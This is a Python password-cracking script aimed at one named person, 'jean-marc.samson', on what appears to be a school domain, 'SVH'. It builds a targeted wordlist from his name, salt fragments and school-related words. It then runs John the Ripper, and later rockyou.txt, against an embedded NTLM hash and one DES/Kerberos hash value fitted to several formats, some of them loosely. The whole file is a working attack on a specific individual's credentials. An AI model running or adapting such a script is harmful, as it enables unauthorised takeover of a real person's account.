#!/usr/bin/env python3
"""
Smart Kerberos Password Cracker for Jean-Marc Samson
This script creates an intelligent wordlist based on all available information
and tries both the DES and NTLM hashes with various formats.
"""

import os
import sys
import subprocess
import itertools
import datetime

def generate_smart_wordlist():
    """Generate a smart, targeted wordlist based on all available information"""
    print("[*] Generating smart wordlist for jean-marc.samson")
    
    # Known information
    first_name = "jean"
    middle_name = "marc"
    last_name = "samson"
    username = "jean-marc.samson"
    domain = "SVH"
    numbers = ["0236", "236", "36", "17"]
    salt = "SVH-0236-S-17jean-marc.samson"
    
    # Components from the salt
    salt_parts = []
    for part in salt.split("-"):
        salt_parts.append(part)
        # Also add without leading zeros
        if part.startswith("0"):
            salt_parts.append(part.lstrip("0"))
    
    words = set()
    
    # Basic name variations
    name_parts = [
        first_name, 
        middle_name,
        last_name,
        first_name[0],  # j
        middle_name[0], # m
        last_name[0],   # s
    ]
    
    # Add all individual parts
    for part in name_parts:
        words.add(part)
        words.add(part.capitalize())
        words.add(part.upper())
    
    # Add domain parts
    domain_parts = ["SVH", "svh", "Svh"]
    for part in domain_parts + salt_parts:
        words.add(part)
    
    # Create combinations
    combinations = []
    
    # First + middle + last name combinations
    combinations.extend([
        f"{first_name}{middle_name}{last_name}",
        f"{first_name}-{middle_name}-{last_name}",
        f"{first_name}_{middle_name}_{last_name}",
        f"{first_name}.{middle_name}.{last_name}",
        f"{first_name}{middle_name[0]}{last_name}",
        f"{first_name[0]}{middle_name[0]}{last_name}",
        f"{first_name[0]}{middle_name}{last_name}",
    ])
    
    # First + middle name combinations
    combinations.extend([
        f"{first_name}{middle_name}",
        f"{first_name}-{middle_name}",
        f"{first_name}_{middle_name}",
        f"{first_name}.{middle_name}",
        f"{first_name}{middle_name[0]}",
        f"{first_name[0]}{middle_name}",
        f"{first_name[0]}{middle_name[0]}",
    ])
    
    # First + last name combinations
    combinations.extend([
        f"{first_name}{last_name}",
        f"{first_name}-{last_name}",
        f"{first_name}_{last_name}",
        f"{first_name}.{last_name}",
        f"{first_name}{last_name[0]}",
        f"{first_name[0]}{last_name}",
        f"{first_name[0]}{last_name[0]}",
    ])
    
    # Middle + last name combinations
    combinations.extend([
        f"{middle_name}{last_name}",
        f"{middle_name}-{last_name}",
        f"{middle_name}_{last_name}",
        f"{middle_name}.{last_name}",
        f"{middle_name}{last_name[0]}",
        f"{middle_name[0]}{last_name}",
        f"{middle_name[0]}{last_name[0]}",
    ])
    
    # Domain + name combinations
    for d in domain_parts:
        combinations.extend([
            f"{d}{first_name}",
            f"{d}{last_name}",
            f"{d}{first_name[0]}{last_name[0]}",
            f"{d}{first_name[0]}{middle_name[0]}{last_name[0]}",
            f"{d}-{first_name}",
            f"{d}-{last_name}",
        ])
    
    # Salt number combinations
    for name_combo in combinations[:]:  # Create a copy to iterate over
        for num in numbers:
            combinations.append(f"{name_combo}{num}")
            combinations.append(f"{num}{name_combo}")
            
    # Add combinations to words
    for combo in combinations:
        words.add(combo)
        words.add(combo.capitalize())
    
    # Add case variations
    case_variations = set()
    for word in words:
        case_variations.add(word.lower())
        case_variations.add(word.upper())
        case_variations.add(word.capitalize())
    words.update(case_variations)
    
    # Add common special characters and numbers
    special_chars = ["!", "@", "#", "$", "%", "&", "*", "123", "1234", "12345", "2023", "2024", "2025"]
    specials = set()
    for word in words:
        for char in special_chars:
            specials.add(f"{word}{char}")
    words.update(specials)
    
    # Add substitutions (l33t speak)
    substitutions = set()
    for word in words:
        if 'a' in word:
            substitutions.add(word.replace('a', '@'))
        if 'e' in word:
            substitutions.add(word.replace('e', '3'))
        if 'i' in word:
            substitutions.add(word.replace('i', '1'))
        if 'o' in word:
            substitutions.add(word.replace('o', '0'))
        if 's' in word:
            substitutions.add(word.replace('s', '$'))
        if 't' in word:
            substitutions.add(word.replace('t', '7'))
    words.update(substitutions)
    
    # Add educational keywords
    edu_words = [
        "teacher", "Teacher", "TEACHER",
        "student", "Student", "STUDENT", 
        "school", "School", "SCHOOL",
        "class", "Class", "CLASS",
        "edu", "Edu", "EDU",
        "password", "Password", "PASSWORD",
        "welcome", "Welcome", "WELCOME",
        "ednet", "Ednet", "EDNET",
        "ns", "NS",
    ]
    words.update(edu_words)
    
    # Filter out very short words (less than 4 chars)
    words = [w for w in words if len(w) >= 4]
    
    # Sort and save to file
    words = sorted(list(words))
    
    output_file = "/workspaces/JaiziahGreene/smart_jm_wordlist.txt"
    with open(output_file, "w") as f:
        for word in words:
            f.write(f"{word}\n")
    
    print(f"[+] Created smart wordlist with {len(words)} entries: {output_file}")
    return output_file

def try_des_hash_formats(wordlist):
    """Try multiple DES hash formats with John the Ripper"""
    print("[*] Trying various DES hash formats with John the Ripper")
    
    john_path = "/workspaces/JaiziahGreene/john-jumbo/run/john"
    
    if not os.path.exists(john_path):
        print(f"[-] John the Ripper not found at {john_path}")
        return False
    
    # Define hash formats to try
    hash_formats = [
        # Format 1: krb5pa-md5
        {
            "file": "/workspaces/JaiziahGreene/krb5_hash_1.txt",
            "format": "krb5pa-md5",
            "hash": "$krb5pa-md5$jean-marc.samson$SVH-0236-S-17jean-marc.samson$b09b49d08ab557f2"
        },
        # Format 2: krb5-3 (des-cbc-md5)
        {
            "file": "/workspaces/JaiziahGreene/krb5_hash_2.txt",
            "format": "krb5-3",
            "hash": "$krb5$jean-marc.samson$SVH-0236-S-17jean-marc.samson$b09b49d08ab557f2"
        },
        # Format 3: descrypt
        {
            "file": "/workspaces/JaiziahGreene/des_hash.txt",
            "format": "descrypt",
            "hash": "b09b49d08ab557f2"
        },
        # Format 4: krb5tgs
        {
            "file": "/workspaces/JaiziahGreene/krb5tgs_hash.txt",
            "format": "krb5tgs",
            "hash": "$krb5tgs$23$*jean-marc.samson$SVH-0236-S-17jean-marc.samson$b09b49d08ab557f2*$b09b49d08ab557f2$"
        }
    ]
    
    # Create hash files
    for fmt in hash_formats:
        with open(fmt["file"], "w") as f:
            f.write(fmt["hash"])
    
    # Try each format
    success = False
    for fmt in hash_formats:
        print(f"\n[*] Trying format: {fmt['format']}")
        print(f"[*] Hash: {fmt['hash']}")
        
        cmd = [
            john_path,
            f"--format={fmt['format']}",
            f"--wordlist={wordlist}",
            fmt["file"]
        ]
        
        print(f"[*] Running: {' '.join(cmd)}")
        
        try:
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )
            
            print(process.stdout)
            
            if process.returncode != 0:
                print(f"[-] Error: {process.stderr}")
                continue
            
            # Check for results
            show_cmd = [john_path, "--show", f"--format={fmt['format']}", fmt["file"]]
            show_process = subprocess.run(
                show_cmd,
                capture_output=True,
                text=True
            )
            
            print(f"[*] Results for {fmt['format']}:")
            print(show_process.stdout)
            
            if "password hash" in show_process.stdout and "0 password hashes cracked" not in show_process.stdout:
                print(f"[+] SUCCESS! Password found with format {fmt['format']}")
                success = True
                break
        
        except Exception as e:
            print(f"[-] Error with format {fmt['format']}: {str(e)}")
    
    return success

def try_ntlm_hash(wordlist):
    """Try the NTLM hash as a fallback"""
    print("\n[*] Trying NTLM hash as fallback")
    
    ntlm_hash = "155d1254d37e9d54bf4bd4d80e55153b"
    ntlm_file = "/workspaces/JaiziahGreene/ntlm_hash.txt"
    
    with open(ntlm_file, "w") as f:
        f.write(f"jean-marc.samson:{ntlm_hash}")
    
    john_path = "/workspaces/JaiziahGreene/john-jumbo/run/john"
    
    cmd = [
        john_path,
        "--format=NT",
        f"--wordlist={wordlist}",
        ntlm_file
    ]
    
    print(f"[*] Running: {' '.join(cmd)}")
    
    try:
        process = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )
        
        print(process.stdout)
        
        # Check for results
        show_cmd = [john_path, "--show", "--format=NT", ntlm_file]
        show_process = subprocess.run(
            show_cmd,
            capture_output=True,
            text=True
        )
        
        print(f"[*] NTLM results:")
        print(show_process.stdout)
        
        if "password hash" in show_process.stdout and "0 password hashes cracked" not in show_process.stdout:
            print(f"[+] SUCCESS! Password found with NTLM")
            return True
    
    except Exception as e:
        print(f"[-] Error with NTLM: {str(e)}")
    
    return False

def main():
    """Main function"""
    print("[+] Smart Kerberos Password Cracker for Jean-Marc Samson")
    print("[+] This will try both DES and NTLM hashes with various formats")
    
    # Generate smart wordlist
    wordlist = generate_smart_wordlist()
    
    # Try DES hash formats
    if try_des_hash_formats(wordlist):
        print("[+] Successfully cracked DES hash!")
    else:
        print("[-] Could not crack DES hash with smart wordlist")
        
        # Try NTLM as fallback
        if try_ntlm_hash(wordlist):
            print("[+] Successfully cracked NTLM hash!")
        else:
            print("[-] Could not crack NTLM hash with smart wordlist")
            
            # Try with rockyou
            rockyou = "/workspaces/JaiziahGreene/hashcat/rockyou.txt"
            if os.path.exists(rockyou):
                print("\n[*] Trying with rockyou.txt")
                print("[*] This may take a while...")
                
                if try_des_hash_formats(rockyou):
                    print("[+] Successfully cracked DES hash with rockyou.txt!")
                elif try_ntlm_hash(rockyou):
                    print("[+] Successfully cracked NTLM hash with rockyou.txt!")
                else:
                    print("[-] Could not crack any hash with rockyou.txt")
            
    print("\n[*] All cracking attempts completed")

if __name__ == "__main__":
    main()